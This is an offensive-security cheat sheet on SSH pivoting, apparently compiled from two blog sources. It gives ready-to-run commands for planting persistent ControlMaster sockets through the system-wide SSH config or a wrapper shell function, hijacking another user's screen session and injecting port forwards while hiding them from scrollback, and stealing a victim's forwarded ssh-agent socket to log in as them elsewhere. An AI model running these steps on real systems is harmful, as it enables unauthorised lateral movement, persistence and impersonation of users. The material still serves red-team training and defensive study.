# SSH pivoting

Pivoting through SSH

- [ControlMaster via SSH client config](#ctrlm_clientconfig)

- [ControlMaster via shell functions](#ctrlm_shellfunction)

- [Hijacking `screen` sessions](#screen_hijacking)

- [SSH socket hijacking](#socket_hijacking)

## <a name="ctrlm_clientconfig"></a>ControlMaster via SSH client config

Alter the system-wide ssh config:

    Host *
    ControlPath /tmp/%r@%h:%p
    ControlMaster auto
    ControlPersist yes

All new SSH sessions will create persistent brokering maste r sockets. in `/tmp`. These sockets can be used to create further sessions, without credentials, even after the original user exits their session.

    ssh -S /tmp/pwnduser@10.0.1.51:22 %h

This can also be used to create a dynamic tunnel inside an existing master socket.

    ssh -O forward -D 9090 -S /tmp/pwnduser@10.0.1.51:22 %h

The master socket needs to be exited explicitly:

    ssh -O exit -S /tmp/pwnduser@10.0.1.51:22 %h

## <a name="ctrlm_shellfunction"></a>ControlMaster via shell functions

Depending on `$PATH`, you should be able to use this wrapper function to create sockets on behalf of the user.

```bash
ssh () 
{ 
    /usr/bin/ssh -o "ControlMaster=auto" -o "ControlPath=/tmp/%r@%h:%p" -o "ControlPersist=yes" "$@";
}
```

## <a name="screen_hijacking"></a>Hijacking screen sessions

Check `/var/run/screen` or run `screen -r`. You can then `su - pwnduser` but you can't directly connect to the screen (can't open terminal error).

To bypass this, use the `script` binary. Example:

    root@box:~# su - pwnduser
    pwnduser@box:~$ screen -ls
    There is a screen on:
           17228.ssh_session (20/10/2019 16:54:22) (detached)
    1 Socket in /var/run/screen/S-pwnduser
    
    pwnduser@box:~$ script /dev/null
    Script started, file is /dev/null
    pwnduser@box:~$ screen -x 17228.ssh_session

We can then insert a tunnel on the fly by making use of the SSH 'escape subshell'. In an ssh session type `~C`. Then `-D:<port>` to add a dynamic forward on the fly. (You can also type `help` here to see what's possible)

This will not work inside `screen` ssh sessions however, as your own `ssh` session will catch the `~C`. So we will need to use the `-X stuff` from outside of the screen session.

    su - pwnduser
    pwnduser@box:~$ screen -S 17228.ssh_session -p 0 -X stuff $'~C'
    pwnduser@box:~$ screen -S 17228.ssh_session -p 0 -X stuff $'-D:9090\n\n'

Stuff'd text is visible inside a session's scrollback. Prevent this by changing scrollback to 0 lines, clearing the screen then setting it back.

    screen -S 18323.my_ssh_session -X scrollback 0
    screen -S 18323.my_ssh_session -p 0 -X stuff $'~C'
    screen -S 18323.my_ssh_session -p 0 -X stuff $'-D:9090\nclear\n'
    screen -S 18323.my_ssh_session -X scrollback 15000

Then, the last piece of the puzzle is to create a local port on the intermediary machine we used so we can connect to it externally.

    root@box:~# (insert ~C)
    ssh> -L7070:localhost:9090
    Forwarding port.
    
    root@box:~# ~#
    The following connections are open:
    (...etc, this should have your forward in it)

## <a name="socket_hijacking"></a>Socket hijacking

When Forward-Agent is used

Find the SSHd process of the victim

    ps aux | grep sshd

Looks for the SSH_AUTH_SOCK on victim's environment variables

    grep SSH_AUTH_SOCK /proc/<pid>/environ

Hijack's victim's ssh-agent socket

    SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXXX/agent.XXXX ssh-add -l

Login to remote systems as the victim

    ssh remote_system -l victim



Sources:

- [0xthem](http://0xthem.blogspot.com/2015/03/hijacking-ssh-to-inject-port-forwards.html)
- [xorl](https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/)